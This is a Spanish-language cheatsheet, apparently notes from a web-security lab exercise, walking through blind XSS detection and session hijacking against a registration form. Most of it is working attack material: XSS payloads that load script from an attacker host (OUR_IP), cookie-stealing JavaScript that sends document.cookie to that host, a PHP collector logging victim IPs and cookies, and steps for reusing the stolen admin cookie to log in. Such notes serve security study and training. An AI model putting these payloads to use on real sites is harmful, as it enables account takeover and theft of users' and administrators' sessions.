---
aliases:
tags:
  - type/cheatsheet
  - vuln/xss
  - technique/execution
  - asset/web-app
  - estado/incompleto
primary categories:
secondary categories:
tertiary categories:
linked:
---

## Secuestro de Sesión

Las aplicaciones web modernas utilizan cookies para mantener la sesión de un usuario a lo largo de diferentes visitas. Esto permite que el usuario solo tenga que iniciar sesión una vez y seguir autenticado incluso si vuelve al sitio otro día.
Sin embargo, si un atacante obtiene la cookie del navegador de la víctima, puede acceder a su cuenta sin conocer su contraseña.

Si podemos ejecutar JavaScript en el navegador de la víctima, podemos recolectar sus cookies y enviarlas a nuestro servidor, lo que permite realizar un ataque de **Session Hijacking** (también llamado *Cookie Stealing*).

---

## Detección de Blind XSS

Normalmente comenzamos un ataque XSS intentando descubrir si existe la vulnerabilidad y dónde aparece.
Pero en este ejercicio tratamos con una vulnerabilidad **Blind XSS**.

Una vulnerabilidad Blind XSS ocurre cuando el payload se ejecuta en una página a la que **no tenemos acceso**, por ejemplo:

* Formulario de contacto
* Reseñas
* Datos del usuario
* Tickets de soporte
* Cabecera HTTP User-Agent

Vamos a analizar la aplicación ubicada en **/hijacking**.
Vemos un formulario de registro con varios campos, así que enviemos datos de prueba:

![[Pasted image 20251117145604.png]]

Después de enviarlo, el sitio muestra:

> Gracias por registrarte. Un administrador revisará tu solicitud.

Esto indica que *no veremos cómo se interpreta nuestro input*, ya que lo verá únicamente un administrador en un panel al que no tenemos acceso.

En condiciones normales (no blind), probaríamos cada campo hasta ver un `alert()`.
Pero aquí no podemos ver la salida, así que ¿cómo detectamos la vulnerabilidad?

La solución es usar un payload JavaScript que **envíe una petición HTTP a nuestro servidor**.
Si recibimos esa petición, significa que nuestro JavaScript se ejecutó y por tanto el campo es vulnerable.

Sin embargo, esto plantea dos problemas:

1. ¿Cómo saber qué campo es el vulnerable?
2. ¿Qué payload XSS funciona?

---

## Cargando un Script Remoto

En HTML podemos incluir JavaScript remoto con:

```html
<script src="http://OUR_IP/script.js"></script>
```

Podemos usar esto para que, si el payload se ejecuta, el navegador pida un archivo a nuestro servidor.
Incluso podemos cambiar el nombre del archivo remoto para identificar qué campo ejecutó el código:

```html
<script src="http://OUR_IP/username"></script>
```

Si recibimos una petición hacia `/username`, sabremos que el campo `username` es vulnerable.

Para las pruebas podemos usar payloads de PayloadsAllTheThings, por ejemplo:

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

Antes de comenzar, levantamos un servidor en nuestra máquina:

```
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

Luego probamos payloads colocando algo como:

```html
<script src=http://OUR_IP/fullname></script>
```

en el campo *fullname*, o:

```html
<script src=http://OUR_IP/username></script>
```

en el campo *username*, etc.

**Tip:**
El campo email valida formato y no es vulnerable.
El campo password probablemente nunca se muestra en texto plano.
Podemos saltarlos.

Vamos probando payloads hasta que nuestro servidor reciba una conexión.
El último payload probado será el funcional, y la ruta solicitada indicará el campo vulnerable.

---

## Session Hijacking

Una vez identificado un payload funcional y el campo vulnerable, podemos robar la sesión.
Esto es similar al ataque de phishing, pero ahora queremos capturar la cookie.

Payloads comunes para robar cookies:

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

Usaremos el segundo porque solo carga una imagen (menos sospechoso).

Creamos el archivo `script.js` en nuestra máquina:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

Luego usamos un payload como:

```html
<script src=http://OUR_IP/script.js></script>
```

Ahora, cuando el administrador vea nuestro input, se ejecutará `script.js` y enviará su cookie a nuestro servidor.

Para procesar las cookies correctamente, creamos un `index.php` como:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Lo guardamos en `/tmp/tmpserver/index.php` y levantamos el servidor PHP otra vez.

Cuando el admin cargue el payload, veremos:

```
/script.js
/index.php?c=cookie=XXXXXXXXXXXX
```

Y en `cookies.txt`:

```
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

---

## Usando la Cookie Robada

Para usarla, entramos a `/hijacking/login.php`, presionamos **Shift+F9** para abrir la barra de *Storage*, hacemos clic en **+** y agregamos:

* **Name:** cookie
* **Value:** f904f93c949d19d870911bf8b05fe7b2
* **Path:** /hijacking

Refrescamos la página…

Y obtenemos acceso como el administrador:

> **Welcome Back Admin.**

---

